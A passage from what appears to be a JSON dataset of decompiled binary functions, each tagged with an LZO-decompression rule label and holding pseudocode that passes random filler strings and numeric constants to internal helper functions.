-0x48) = 0x42f023;\n    fcn.004055ab(*(puVar2 + -0x44));\n    puVar1 = var_90h;\n    *(var_90h + -4) = 0x42f035;\n    fcn.0040534e();\n    *(puVar1 + -4) = 0x42f03d;\n    fcn.00404ff2();\n    var_9ch = puVar1;\n    var_98h = puVar1 + -0x70;\n    var_94h = puVar1 + -0x18;\n    *(puVar1 + -0x74) = \"ekfadtdhojfszteuqptravjf\";\n    *(puVar1 + -0x78) = 0x42f072;\n    fcn.00401e79(*(puVar1 + -0x74));\n    var_a0h = var_98h + 0x10;\n    var_10h = 8;\n    *(puVar1 + -0x78) = \"sazrjakpmmhgjrbmchfagmmwtphmcxppvgpwhunmoeilpeuqlcxffocyaivveiapniwmwsomwzqyozkkc\";\n    *(puVar1 + -0x7c) = 0x42f09d;\n    fcn.00401e79(*(puVar1 + -0x78));\n    var_a4h = var_98h + 10;\n    var_10h = 9;\n    *(puVar1 + -0x7c) = \"qmwdcskaxgryluueawzenwcnzlchgoahutwpt\";\n    *(puVar1 + -0x80) = 0x42f0c8;\n    fcn.00401e79(*(puVar1 + -0x7c));\n    var_10h = 10;\n    *(puVar1 + -0x80) = \"qsbakltfspocknruzdzsjvfimtptnmsbifoznfoohovzreuuuhovzjnkakuh\";\n    *(puVar1 + -0x84) = 0x42f0ed;\n    fcn.00401e79(*(puVar1 + -0x80));\n    puVar3 = var_98h;\n    var_98h[1] = 0x40bce200;\n    *puVar3 = 0;\n    puVar3[8] = 0x575;\n    *(puVar3 + 9) = 0;\n    var_10h = 0;\n    *(puVar1 + -0x84) = 0x42f11f;\n    fcn.004013de(*(puVar1 + -0x80));\n    puVar1 = var_9ch;\n    var_b0h = var_9ch;\n    *(var_9ch + -4) = var_9ch;\n    var_ach = puVar1 + -0x70;\n    var_a8h = puVar1 + -0x20;\n    *(puVar1 + -0x74) = \"qtbybfxjcxwmhxdebuuxtzrtgtsheccsrgdnxfcastdeshdoyxkjqkxncljqgtsvzxgzlwrzlsvj\";\n    *(puVar1 + -0x78) = 0x42f15b;\n    fcn.00401e79(*(puVar1 + -0x74));\n    var_b4h = var_ach + 9;\n    var_10h = 6;\n    *(puVar1 + -0x78) = \"ugksvcwssgennfwuvhfarleokaspdchbixcxjegdmpzuivgzf\";\n    *(puVar1 + -0x7c) = 0x42f186;\n    fcn.00401e79(*(puVar1 + -0x78));\n    var_10h = 7;\n    *(puVar1 + -0x7c) = \"doyqzsmktlkmhauxoovelomfymbk\";\n    *(puVar1 + -0x80) = 0x42f1ab;\n    fcn.00401e79(*(puVar1 + -0x7c));\n    puVar3 = var_ach;\n    var_ach[1] = 0x40db7d80;\n    *puVar3 = 0;\n    *(puVar3 + 2) = 1;\n    puVar3[0x10] = 0x40cb4180;\n    puVar3[0xf] = 0;\n    puVar3[0x11] = 0x588;\n    puVar3[0x13] = 0x40e261c0;\n    puVar3[0x12] = 0;\n    puVar3[0x1a] = 0xa67;\n    *(puVar3 + 0x1b) = 0;\n    *(puVar1 + -0x80) = 0x42f1fd;\n    fcn.0040228e(*(puVar1 + -0x7c));\n    puVar1 = var_b0h;\n    var_c0h = var_b0h;\n    *(var_b0h + -4) = var_b0h;\n    var_bch = puVar1 + -0x3c;\n    var_b8h = puVar1 + -0x1c;\n    var_10h = 0;\n    *(puVar1 + -0x40) = \"dlatdvyvpldaippgcdzsvmmcqdsyrnezxksceasigqbaiupnanddriyuzbxr\";\n    *(puVar1 + -0x44) = 0x42f23b;\n    fcn.00401e79(*(puVar1 + -0x40));\n    var_10h = 5;\n    *(puVar1 + -0x44) = 0x544a21;\n    *(puVar1 + -0x48) = 0x42f260;\n    fcn.00401e79(*(puVar1 + -0x44));\n    piVar4 = var_bch;\n    *var_bch = &fcn.0042edc0::var_38h;\n    *(piVar4 + 1) = 0;\n    *(piVar4 + 0xe) = 1;\n    var_10h = 0;\n    *(puVar1 + -0x48) = 0x42f287;\n    fcn.00403cbf(*(puVar1 + -0x44));\n    puVar2 = var_c0h;\n    *(var_c0h + -4) = 0x42f29c;\n    fcn.00403b02();\n    var_c8h = puVar2;\n    var_c4h = puVar2 + -0x40;\n    *(puVar2 + -0x44) = \"necduyeszircqauotfirmtowkotxihnvksdjfivhhjwgxvgqqfarkcqnhnsosgxwgqkrmqopgoskoqudnud\";\n    *(puVar2 + -0x48) = 0x42f2c4;\n    fcn.00401e79(*(puVar2 + -0x44));\n    puVar1 = var_c4h;\n    *var_c4h = 0;\n    *(puVar1 + 8) = 0x40cb8800;\n    *(puVar1 + 4) = 0;\n    *(puVar1 + 0x24) = 0x2642;\n    puVar1[0x28] = 1;\n    puVar1[0x2c] = 1;\n    *(puVar1 + 0x30) = 0x47f;\n    *(puVar1 + 0x38) = 0x40d41480;\n    *(puVar1 + 0x34) = 0;\n    puVar1[0x3c] = 1;\n    *(puVar2 + -0x48) = 0x42f310;\n    fcn.00405998(*(puVar2 + -0x44));\n    puVar1 = var_c8h;\n    var_d0h = var_c8h;\n    *(var_c8h + -4) = var_c8h;\n    var_cch = puVar1 + -0x24;\n    *(puVar1 + -0x28) = \"igrhurgpurfgmasckrhyenllxpjlntvxsxhelatfnqvqxjm\";\n    *(puVar1 + -0x2c) = 0x42f346;\n    fcn.00401e79(*(puVar1 + -0x28));\n    piVar4 = var_cch;\n    *var_cch = &fcn.0042edc0::var_50h;\n    piVar4[7] = 0x919;\n    piVar4[8] = 0xaa6;\n    *(puVar1 + -0x2c) = 0x42f36c;\n    fcn.004031c5(*(puVar1 + -0x28));\n    puVar1 = var_d0h;\n    *(var_d0h + -4) = 0x42f381;\n    fcn.00403b02();\n    *(puVar1 + -4) = 0x42f389;\n    fcn.00404e85();\n    var_dch = puVar1;\n    var_d8h = puVar1 + -0x80;\n    var_d4h = puVar1 + -0x18;\n    *(puVar1 + -0x84) = \"jqyjjgrztuhikweeuwutryhkxwvzysqjxxokhwtevjqd\";\n    *(puVar1 + -0x88) = 0x42f3ba;\n    fcn.00401e79(*(puVar1 + -0x84));\n    var_e0h = var_d8h + 0x12;\n    var_10h = 2;\n    *(puVar1 + -0x88) = \"htxujqyaapuvgucrvrnwhlxmbkpxxsqvxwkkokcrdgdswevwizfooofvkxnwdveeoimucjskrofin\";\n    *(puVar1 + -0x8c) = 0x42f3e5;\n    fcn.00401e79(*(puVar1 + -0x88));\n    var_e4h = var_d8h + 8;\n    var_10h = 3;\n    *(puVar1 + -0x8c) = \"rtzdwdls\";\n    *(puVar1 + -0x90) = 0x42f410;\n    fcn.00401e79(*(puVar1 + -0x8c));\n    var_10h = 4;\n    *(puVar1 + -0x90) = \"zsemlnijlcvkwhpheeljqrzawzufldaduehnorl\";\n    *(puVar1 + -0x94) = 0x42f435;\n    fcn.00401e79(*(puVar1 + -0x90));\n    piVar4 = var_d8h;\n    *var_d8h = &fcn.0042edc0::var_68h;\n    piVar4[1] = 0x235;\n    piVar4[0xf] = 0x40ec9d00;\n    piVar4[0xe] = 0;\n    piVar4[0x11] = 0x40e23700;\n    piVar4[0x10] = 0;\n    piVar4[0x18] = 0x833;\n    *(piVar4 + 0x19) = 0;\n    var_10h = 0;\n    *(puVar1 + -0x94) = 0x42f482;\n    fcn.004013ac(*(puVar1 + -0x90));\n    puVar1 = var_dch;\n    *(var_dch + -4) = 0x42f497;\n    fcn.00403b02();\n    var_ech = puVar1;\n    var_e8h = puVar1 + -0x44;\n    *(puVar1 + -0x48) = \"npezsmiwfcgh\";\n    *(puVar1 + -0x4c) = 0x42f4bf;\n    fcn.00401e79(*(puVar1 + -0x48));\n    puVar3 = var_e8h;\n    var_e8h[1] = 0x40b41900;\n    *puVar3 = 0;\n    *(puVar3 + 2) = 1;\n    puVar3[4] = 0x40cb2800;\n    puVar3[3] = 0;\n    puVar3[6] = 0x40d757c0;\n    puVar3[5] = 0;\n    *(puVar3 + 0xd) = 0;\n    puVar3[0xf] = 0x40d7d780;\n    puVar3[0xe] = 0;\n    *(puVar3 + 0x10) = 0;\n    *(puVar1 + -0x4c) = 0x42f515;\n    fcn.00402414(*(puVar1 + -0x48));\n    puVar2 = var_ech;\n    var_f8h = var_ech;\n    *(var_ech + -4) = var_ech;\n    var_f4h = puVar2 + -0x50;\n    var_f0h = puVar2 + -0x30;\n    *(puVar2 + -0x54) = \"nbtzhlnklykswmeujqkypdcsudwidettmcvavgularyxlcadobvoiecdwhwap\";\n    *(puVar2 + -0x58) = 0x42f54c;\n    fcn.00401e79(*(puVar2 + -0x54));\n    var_10h = 1;\n    *(puVar2 + -0x58) = \"wczwdshvsilldivkkcvrcjdnmzceqyqudosuvmzlssdrmxqz\";\n    *(puVar2 + -0x5c) = 0x42f571;\n    fcn.00401e79(*(puVar2 + -0x58));\n    puVar1 = var_f4h;\n    *var_f4h = 0;\n    puVar1[0x1c] = 0;\n    *(puVar1 + 0x38) = 0x1439;\n    *(puVar1 + 0x3c) = 0x147d;\n    *(puVar1 + 0x44) = 0x40ecee40;\n    *(puVar1 + 0x40) = 0;\n    puVar1[0x48] = 0;\n    puVar1[0x4c] = 0;\n    var_10h = 0;\n    *(puVar2 + -0x5c) = 0x42f5b6;\n    fcn.0040344a(*(puVar2 + -0x58));\n    *in_FS_OFFSET = var_18h;\n    return var_70h;\n}\n",
        "token_count": 5103
    },
    "00430ef0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __fastcall fcn.00430ef0(int32_t param_1)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *puVar7;\n    uint *puVar9;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    uint auStack408 [9];\n    uchar auStack372 [24];\n    uint uStack348;\n    uchar *var_138h;\n    uchar *var_134h;\n    uchar *var_130h;\n    uchar *var_12ch;\n    uchar *var_128h;\n    int32_t *var_124h;\n    uchar *var_120h;\n    uint *var_11ch;\n    uchar *var_118h;\n    uint *var_114h;\n    uchar *var_110h;\n    uchar *var_10ch;\n    uint *var_108h;\n    uchar *var_104h;\n    uchar *var_100h;\n    uchar *var_fch;\n    uchar *var_f8h;\n    int32_t *var_f4h;\n    uchar *var_f0h;\n    uint *var_ech;\n    uchar *var_e8h;\n    uchar *var_e4h;\n    uchar *var_e0h;\n    uchar *var_dch;\n    uchar *var_d8h;\n    uchar *var_d4h;\n    uchar *var_d0h;\n    uchar *var_cch;\n    uint *var_c8h;\n    uchar *var_c4h;\n    uchar *var_c0h;\n    uchar *var_bch;\n    uchar *var_b8h;\n    uchar *var_b4h;\n    uchar *var_b0h;\n    uchar *var_ach;\n    uchar *var_a8h;\n    uchar *var_a4h;\n    uchar *var_a0h;\n    int32_t var_9ch;\n    int32_t var_98h;\n    int32_t var_94h;\n    int32_t var_90h;\n    uchar *var_8ch;\n    uint *var_88h;\n    uchar *var_84h;\n    uint var_80h;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *puVar6;\n    uint *puVar8;\n    \n    var_1ch = &fcn.00430ef0::var_138h;\n    var_10h = 0xffffffff;\n    var_14h = 0x4504c0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00430ef0::var_18h;\n    var_9ch = param_1 + 0x14;\n    var_90h = param_1;\n    var_20h = param_1;\n    fcn.004040a7();\n    var_98h = var_90h + 0x40;\n    fcn.004040a7();\n    var_94h = var_90h + 0x60;\n    fcn.004040a7();\n    fcn.00404c0a(0, 0x40ba0800, 1, 0x234, 0xb72);\n    var_8ch = &stack0xfffffea8;\n    uStack348 = 0x430fb3;\n    fcn.00404c32(0xc60, 0x1791);\n    var_88h = &stack0xfffffe68;\n    var_84h = &stack0xfffffe8c;\n    var_10h = 2;\n    fcn.00401e79(\"dxgcrlbantorkidgmicrswppnlsmnrywhkqvvwoxzljdqnvjvkdbeojlptfscaxesqphfpwcbddhsldld\");\n    var_10h = 0x10;\n    arg_8h = \"arqulnqpdwnyksneozvdbphxrfphzjzpmpubynqdacvbbcvljksfimjvtqugqllrpvmxjuawwwbasvbjhmnuukzzhlapk\";\n    fcn.00401e79(\"arqulnqpdwnyksneozvdbphxrfphzjzpmpubynqdacvbbcvljksfimjvtqugqllrpvmxjuawwwbasvbjhmnuukzzhlapk\");\n    puVar4 = var_88h;\n    var_88h[1] = 0x40e14720;\n    *puVar4 = 0;\n    *(puVar4 + 8) = 1;\n    *(puVar4 + 0xf) = 0;\n    fcn.00403918(arg_8h);\n    puVar2 = var_8ch;\n    puVar5 = var_8ch + -0x14;\n    puVar6 = var_8ch + -0x14;\n    *(var_8ch + -4) = 0x1f9;\n    *(puVar2 + -8) = 1;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -0x10) = 0;\n    *puVar5 = 1;\n    *(puVar2 + -0x18) = 0x431074;\n    fcn.00402ff9(*puVar6, *(puVar2 + -0x10), *(puVar2 + -0xc), *(puVar2 + -8), *(puVar2 + -4));\n    var_ach = puVar2 + -0x34;\n    var_a8h = puVar2 + -0x34;\n    *(puVar2 + -0x1c) = 0x40e22700;\n    *(puVar2 + -0x20) = 0;\n    *(puVar2 + -0x24) = 0x40c9eb80;\n    *(puVar2 + -0x28) = 0;\n    *(puVar2 + -0x2c) = 0x40e978e0;\n    *(puVar2 + -0x30) = 0;\n    *(puVar2 + -0x18) = 0xaf0;\n    *(puVar2 + -0x34) = 0x17cf;\n    *(puVar2 + -0x38) = 0x4310c3;\n    fcn.00403eea(*(puVar2 + -0x34), *(puVar2 + -0x30), *(puVar2 + -0x2c), *(puVar2 + -0x28), *(puVar2 + -0x24), \n                 *(puVar2 + -0x20), *(puVar2 + -0x1c), *(puVar2 + -0x18));\n    var_a4h = puVar2 + -0xbc;\n    var_a0h = puVar2 + -0x50;\n    var_10h = 2;\n    *(puVar2 + -0xc0) = \"jtsnoujteaosxkopaphbstqnyfjowhrqhybnieqapbgldtsjafneyfyheyrncfidwybhyxdtculbecxtxgqjzmqsigk\";\n    *(puVar2 + -0xc4) = 0x4310fb;\n    fcn.00401e79(*(puVar2 + -0xc0));\n    var_b0h = var_a4h + 0x4c;\n    var_10h = 0xc;\n    *(puVar2 + -0xc4) = \"rosuzngnar\";\n    *(puVar2 + -200) = 0x431126;\n    fcn.00401e79(*(puVar2 + -0xc4));\n    var_b4h = var_a4h + 0x34;\n    var_10h = 0xd;\n    *(puVar2 + -200) = \"eqbrvexihsxdxckpfvvjippqrxucpj\";\n    *(puVar2 + -0xcc) = 0x431151;\n    fcn.00401e79(*(puVar2 + -200));\n    var_b8h = var_a4h + 0x1c;\n    var_10h = 0xe;\n    *(puVar2 + -0xcc) = \"limqiinuyqgrcysrvydsgpphyatujumjhxjxemfzaopqhtzxkhjecmshdfhpdfhrriekjvptwbwyivfsynokaampid\";\n    *(puVar2 + -0xd0) = 0x43117c;\n    fcn.00401e79(*(puVar2 + -0xcc));\n    var_10h = 0xf;\n    *(puVar2 + -0xd0) = \"krrybyjmwkefkzcff\";\n    *(puVar2 + -0xd4) = 0x43119e;\n    fcn.00401e79(*(puVar2 + -0xd0));\n    puVar1 = var_a4h;\n    *(var_a4h + 0x18) = 0xecc;\n    puVar1[100] = 1;\n    puVar1[0x68] = 0;\n    puVar1[0x84] = 1;\n    *(puVar2 + -0xd4) = 0x4311ca;\n    fcn.0040163b(*(puVar2 + -0xd0));\n    puVar2 = var_a8h;\n    var_c0h = var_a8h;\n    *(var_a8h + -4) = var_a8h;\n    var_bch = puVar2 + -0x2c;\n    var_10h = 2;\n    *(puVar2 + -0x30) = \"ekyklsglszqlvciuwqnrlgmesrmdzbjccjapdnpqxmhjiaytpmapumjm\";\n    *(puVar2 + -0x34) = 0x431202;\n    fcn.00401e79(*(puVar2 + -0x30));\n    puVar1 = var_bch;\n    *var_bch = 0;\n    *(puVar1 + 0x20) = 0x40dbe180;\n    *(puVar1 + 0x1c) = 0;\n    *(puVar1 + 0x28) = 0x40cdfd80;\n    *(puVar1 + 0x24) = 0;\n    *(puVar2 + -0x34) = 0x431237;\n    fcn.0040410b(*(puVar2 + -0x30));\n    puVar1 = var_c0h;\n    var_cch = var_c0h;\n    *(var_c0h + -4) = var_c0h;\n    var_c8h = puVar1 + -0x58;\n    var_c4h = puVar1 + -0x18;\n    *(puVar1 + -0x5c) = \"rfdvftxnuesmmebfekczrepmsoedfoxpcfazickfcc\";\n    *(puVar1 + -0x60) = 0x431273;\n    fcn.00401e79(*(puVar1 + -0x5c));\n    var_10h = 0xb;\n    *(puVar1 + -0x60) = \"jfbgpppksuborvkkbffndkhwapihsde\";\n    *(puVar1 + -100) = 0x431298;\n    fcn.00401e79(*(puVar1 + -0x60));\n    puVar4 = var_c8h;\n    var_c8h[1] = 0x40c69a00;\n    *puVar4 = 0;\n    puVar4[2] = 0x1fa8;\n    puVar4[3] = 0x1cfb;\n    puVar4[4] = 0x3ca;\n    puVar4[5] = 0x6c7;\n    puVar4[0xc] = 0xa9e;\n    puVar4[0xd] = 0xa0f;\n    puVar4[0xf] = 0x40f2c490;\n    puVar4[0xe] = 0;\n    var_10h = 2;\n    *(puVar1 + -100) = 0x4312fa;\n    fcn.00403e40(*(puVar1 + -0x60));\n    puVar2 = var_cch;\n    var_d8h = var_cch;\n    *(var_cch + -4) = var_cch;\n    var_d4h = puVar2 + -0x68;\n    var_d0h = puVar2 + -0x18;\n    *(puVar2 + -0x6c) = \"bdxqgjmkdgahtecnyubduaxujemdusshbfzzwp\";\n    *(puVar2 + -0x70) = 0x431336;\n    fcn.00401e79(*(puVar2 + -0x6c));\n    var_dch = var_d4h + 0x20;\n    var_10h = 9;\n    *(puVar2 + -0x70) = \"fgtzhshvzdncnfqdhferozlaivvdfjmpstgblvslkbzknrowtlnnjvj\";\n    *(puVar2 + -0x74) = 0x431361;\n    fcn.00401e79(*(puVar2 + -0x70));\n    var_10h = 10;\n    *(puVar2 + -0x74) = \"okcocjgqabzrvxa\";\n    *(puVar2 + -0x78) = 0x431383;\n    fcn.00401e79(*(puVar2 + -0x74));\n    puVar1 = var_d4h;\n    *(var_d4h + 0x18) = 0x3c6;\n    *(puVar1 + 0x1c) = 0x759;\n    *(puVar1 + 0x3c) = 0x40df3180;\n    *(puVar1 + 0x38) = 0;\n    *(puVar1 + 0x44) = 0x40b76c00;\n    *(puVar1 + 0x40) = 0;\n    *(puVar1 + 0x4c) = 0x40f68f10;\n    *(puVar1 + 0x48) = 0;\n    *(puVar2 + -0x78) = 0x4313d1;\n    fcn.004060eb(*(puVar2 + -0x74));\n    puVar2 = var_d8h;\n    var_e8h = var_d8h;\n    *(var_d8h + -4) = var_d8h;\n    var_e4h = puVar2 + -0x44;\n    var_e0h = puVar2 + -0x2c;\n    var_10h = 2;\n    *(puVar2 + -0x48) = \"zoxarnvfmjwhxfqxgfqzkbxqyupngzqpcrbkavibirhtycoimgqnbqdkfm\";\n    *(puVar2 + -0x4c) = 0x431411;\n    fcn.00401e79(*(puVar2 + -0x48));\n    var_10h = 8;\n    *(puVar2 + -0x4c) = \"hbxpdldziceyhgvosbhhfliaubdnruhwopedfhxorxmgtth\";\n    *(puVar2 + -0x50) = 0x431433;\n    fcn.00401e79(*(puVar2 + -0x4c));\n    puVar1 = var_e4h;\n    var_e4h[0x30] = 1;\n    puVar1[0x34] = 1;\n    *(puVar1 + 0x38) = 0x112e;\n    *(puVar1 + 0x40) = 0x40eac0c0;\n    *(puVar1 + 0x3c) = 0;\n    var_10h = 2;\n    *(puVar2 + -0x50) = 0x43146d;\n    fcn.0040262b(*(puVar2 + -0x4c));\n    puVar1 = var_e8h;\n    var_f0h = var_e8h;\n    *(var_e8h + -4) = var_e8h;\n    var_ech = puVar1 + -0x38;\n    *(puVar1 + -0x3c) = \"wtdocgonezgpctzetjaskrqktuhvtevtojenutjxfquzpdzngktbqhzoexwttkpthxyumbsbhnoz\";\n    *(puVar1 + -0x40) = 0x4314a3;\n    fcn.00401e79(*(puVar1 + -0x3c));\n    puVar4 = var_ech;\n    *var_ech = 0x274;\n    puVar4[8] = 0x40d19280;\n    puVar4[7] = 0;\n    puVar4[9] = 0xb2e;\n    *(puVar4 + 10) = 0;\n    puVar4[0xc] = 0x40e8aaa0;\n    puVar4[0xb] = 0;\n    *(puVar4 + 0xd) = 0;\n    *(puVar1 + -0x40) = 0x4314ea;\n    fcn.00404025(*(puVar1 + -0x3c));\n    puVar1 = var_f0h;\n    puVar7 = var_f0h + -0x14;\n    puVar8 = var_f0h + -0x14;\n    var_f8h = var_f0h + -0x14;\n    *(var_f0h + -0xc) = 0x40c41e00;\n    *(puVar1 + -0x10) = 0;\n    *(puVar1 + -4) = 0x6d0;\n    *(puVar1 + -8) = 0x467;\n    *puVar7 = 1;\n    *(puVar1 + -0x18) = 0x431529;\n    fcn.00402fe0(*puVar8, *(puVar1 + -0x10), *(puVar1 + -0xc), *(puVar1 + -8), *(puVar1 + -4));\n    var_f4h = puVar1 + -0x50;\n    *(puVar1 + -0x54) = \"avxfddbjpjrwkxkbdzcskxiubpyxajisidqbcbxmzswertusxfoatubprznzslvjggdotaexhkvflaz\";\n    *(puVar1 + -0x58) = 0x431553;\n    fcn.00401e79(*(puVar1 + -0x54));\n    piVar3 = var_f4h;\n    *var_f4h = &fcn.00430ef0::var_38h;\n    *(piVar3 + 1) = 0;\n    piVar3[3] = 0x40bb7f00;\n    piVar3[2] = 0;\n    *(piVar3 + 4) = 0;\n    piVar3[5] = 0x812;\n    *(piVar3 + 6) = 0;\n    *(piVar3 + 7) = 0;\n    *(piVar3 + 8) = 0;\n    *(puVar1 + -0x58) = 0x431597;\n    fcn.00404b1f(*(puVar1 + -0x54));\n    puVar2 = var_f8h;\n    *(var_f8h + -4) = 0x4315ac;\n    fcn.00403b02();\n    *(puVar2 + -4) = 0x111b;\n    *(puVar2 + -8) = 0;\n    *(puVar2 + -0xc) = 0x4315c9;\n    fcn.0040600a(*(puVar2 + -8), *(puVar2 + -4));\n    var_100h = puVar2 + -0x18;\n    *(puVar2 + -0x18) = &fcn.00430ef0::var_50h;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -0x10) = 0x1a;\n    *(puVar2 + -0x14) = 0x6b9;\n    *(puVar2 + -0x1c) = 0x4315f8;\n    fcn.0040385a(*(puVar2 + -0x18), *(puVar2 + -0x14), *(puVar2 + -0x10), *(puVar2 + -0xc));\n    *(puVar2 + -0x1c) = 0x431605;\n    fcn.00403b02();\n    var_fch = puVar2 + -0x38;\n    *(puVar2 + -0x3c) =\n         \"ljqjjtmaxwtxughqsftcfhrgtbhvqggpqmslgdgvvrpnxggfxmtpzjndihnplqnsjpjhbzqorzscbthyjrlyxmxwqmqemfef\";\n    *(puVar2 + -0x40) = 0x43162a;\n    fcn.00401e79(*(puVar2 + -0x3c));\n    puVar1 = var_fch;\n    var_fch[0x18] = 0;\n    puVar1[0x1c] = 0;\n    *(puVar2 + -0x40) = 0x431648;\n    fcn.0040442b(*(puVar2 + -0x3c));\n    puVar1 = var_100h;\n    var_10ch = var_100h;\n    *(var_100h + -4) = var_100h;\n    var_108h = puVar1 + -0x44;\n    var_104h = puVar1 + -0x18;\n    *(puVar1 + -0x48) = \"fctpcvdkgvxugchlylph\";\n    *(puVar1 + -0x4c) = 0x431684;\n    fcn.00401e79(*(puVar1 + -0x48));\n    var_10h = 7;\n    *(puVar1 + -0x4c) = \"bfrgoestqxevacbndbqjygpzgkaucsnivrqkptssffdkvqqhdzcgimlhukmlatebn\";\n    *(puVar1 + -0x50) = 0x4316a9;\n    fcn.00401e79(*(puVar1 + -0x4c));\n    puVar4 = var_108h;\n    *var_108h = 0x448;\n    puVar4[2] = 0x40f3fdc0;\n    puVar4[1] = 0;\n    puVar4[4] = 0x40db3940;\n    puVar4[3] = 0;\n    var_10h = 2;\n    *(puVar1 + -0x50) = 0x4316e8;\n    fcn.0040395e(*(puVar1 + -0x4c));\n    puVar1 = var_10ch;\n    puVar9 = var_10ch + -4;\n    var_118h = var_10ch + -4;\n    *(var_10ch + -4) = &fcn.00430ef0::var_68h;\n    *(puVar1 + -8) = 0x43170c;\n    fcn.00403bbb(*puVar9);\n    *(puVar1 + -8) = 0x431719;\n    fcn.00403b02();\n    var_114h = puVar1 + -0x5c;\n    var_110h = puVar1 + -0x1c;\n    *(puVar1 + -0x60) = \"lrgughnvosqsjinscbgfbpzgjclkhcxubfvejnfyshjeufbbfmtmhhjwndfbovdynllnryxjgvhexachfgetgp\";\n    *(puVar1 + -100) = 0x431747;\n    fcn.00401e79(*(puVar1 + -0x60));\n    var_11ch = var_114h + 9;\n    var_10h = 5;\n    *(puVar1 + -100) = \"fazmvsivgeqefdolczhuvlaedqmxftiyjkiwzletazaxxvguzvhbbplotfidxxxyicvikxxztlxkghgtlz\";\n    *(puVar1 + -0x68) = 0x431772;\n    fcn.00401e79(*(puVar1 + -100));\n    var_10h = 6;\n    *(puVar1 + -0x68) = \"mhfnnkknycmckuayscesgjbhogfrznxxbeb\";\n    *(puVar1 + -0x6c) = 0x431797;\n    fcn.00401e79(*(puVar1 + -0x68));\n    puVar4 = var_114h;\n    var_114h[1] = 0x40f57af0;\n    *puVar4 = 0;\n    puVar4[2] = 0x14f2;\n    puVar4[0xf] = 0x703;\n    var_10h = 2;\n    *(puVar1 + -0x6c) = 0x4317cf;\n    fcn.00403daf(*(puVar1 + -0x68));\n    puVar1 = var_118h;\n    var_128h = var_118h;\n    *(var_118h + -4) = var_118h;\n    var_124h = puVar1 + -0x4c;\n    var_120h = puVar1 + -0x1c;\n    *(puVar1 + -0x50) = \"satorxwossfmizumgdvdskevhvovjscxbtbleaiylkmuwvbnoczkmxxgg\";\n    *(puVar1 + -0x54) = 0x43180b;\n    fcn.00401e79(*(puVar1 + -0x50));\n    var_10h = 4;\n    *(puVar1 + -0x54) = \"uobrlisathzckgjrqswtrtnpsrmw\";\n    *(puVar1 + -0x58) = 0x431830;\n    fcn.00401e79(*(puVar1 + -0x54));\n    piVar3 = var_124h;\n    *var_124h = &fcn.00430ef0::var_80h;\n    *(piVar3 + 1) = 1;\n    *(piVar3 + 2) = 1;\n    *(piVar3 + 3) = 0;\n    *(piVar3 + 4) = 1;\n    piVar3[5] = 0x17d0;\n    *(piVar3 + 0x12) = 1;\n    var_10h = 2;\n    *(puVar1 + -0x58) = 0x43186d;\n    fcn.0040362a(*(puVar1 + -0x54));\n    puVar2 = var_128h;\n    *(var_128h + -4) = 0x431882;\n    fcn.00403b02();\n    var_134h = puVar2;\n    var_130h = puVar2 + -0x44;\n    var_12ch = puVar2 + -0x24;\n    *(puVar2 + -0x48) = \"hxmbdompwuvwksgbapretqhfjfvfjvhwkfsniqxkcrjde\";\n    *(puVar2 + -0x4c) = 0x4318b0;\n    fcn.00401e79(*(puVar2 + -0x48));\n    var_10h = 3;\n    *(puVar2 + -0x4c) = \"cxkcmbvggfsrffhdddudwsplywcxpewmtastuakkqjabntiflszioakuwtswvflznesxcbmriwyyhxnxnictljqfni\";\n    *(puVar2 + -0x50) = 0x4318d2;\n    fcn.00401e79(*(puVar2 + -0x4c));\n    puVar1 = var_130h;\n    *(var_130h + 0x1c) = 0x40c3f100;\n    *(puVar1 + 0x18) = 0;\n    puVar1[0x38] = 1;\n    puVar1[0x3c] = 0;\n    puVar1[0x40] = 0;\n    *(puVar2 + -0x50) = 0x431902;\n    fcn.004019ba(*(puVar2 + -0x4c));\n    puVar1 = var_134h;\n    var_138h = var_134h;\n    *(var_134h + -4) = var_134h;\n    var_10h = 2;\n    *(puVar1 + -0x1c) = \"gbpnruseftirpvfhcrqobuyymwnrtuodtwntcqbanghzdazkmmokpcr\";\n    *(puVar1 + -0x20) = 0x43192f;\n    fcn.00401e79(*(puVar1 + -0x1c));\n    *(puVar1 + -0x20) = 0x43193f;\n    fcn.0040402f(*(puVar1 + -0x1c));\n    *in_FS_OFFSET = var_18h;\n    return var_90h;\n}\n",
        "token_count": 6895
    },
    "00432ca0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __fastcall fcn.00432ca0(int32_t param_1)\n\n{\n    uchar *puVar1;\n    uint *puVar2;\n    uchar *puVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    uint auStack300 [12];\n    uchar *puStack252;\n    uchar *var_e8h;\n    int32_t *var_e4h;\n    uchar *var_e0h;\n    uint *var_dch;\n    uchar *var_d8h;\n    uchar *var_d4h;\n    int32_t *var_d0h;\n    int32_t *var_cch;\n    uchar *var_c8h;\n    int32_t *var_c4h;\n    uchar *var_c0h;\n    uchar *var_bch;\n    int32_t *var_b8h;\n    uchar *var_b4h;\n    uint *var_b0h;\n    uchar *var_ach;\n    uint *var_a8h;\n    uint *var_a4h;\n    uchar *var_a0h;\n    uint *var_9ch;\n    uchar *var_98h;\n    uchar *var_94h;\n    uint *var_90h;\n    uchar *var_8ch;\n    uchar *var_88h;\n    uchar *var_84h;\n    uchar *var_80h;\n    uchar *var_7ch;\n    uint *var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *puVar6;\n    \n    var_1ch = &fcn.00432ca0::var_e8h;\n    var_10h = 0xffffffff;\n    var_14h = 